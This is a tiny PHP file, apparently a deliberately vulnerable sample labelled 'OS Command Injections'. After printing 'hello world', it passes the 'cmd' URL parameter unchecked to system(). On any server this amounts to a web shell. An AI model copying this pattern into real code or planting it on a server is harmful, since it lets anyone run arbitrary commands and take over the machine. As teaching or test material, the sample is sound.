<?php

echo "hello world";

$cmd = $_GET['cmd'];
system($cmd); // OS Command Injections
?>